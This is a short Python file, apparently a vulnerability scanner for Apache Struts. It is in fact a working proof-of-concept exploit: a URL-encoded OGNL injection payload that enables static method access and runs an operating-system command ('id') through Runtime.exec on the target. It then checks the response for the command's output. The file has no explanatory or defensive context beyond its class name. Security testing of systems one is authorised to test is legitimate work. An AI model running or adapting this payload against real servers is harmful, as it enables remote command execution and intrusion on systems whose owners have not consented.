import requests

class StrutsScanner:
    def __init__(self, target, timeout=5):
        self.target = target
        self.timeout = timeout

    def check_vulnerability(self):
        payload = "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23foo.read(new%20byte%5B9999%5D))%7D"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        try:
            response = requests.post(self.target, data=payload, headers=headers, timeout=self.timeout)
            if "uid=" in response.text:
                return True  # Vulnerable
        except Exception as e:
            pass
        return False  # Not vulnerable or can't connect

"""
target = "http://localhost:8080/showcase.action"
scanner = StrutsScanner(target)
print(scanner.check_vulnerability())
"""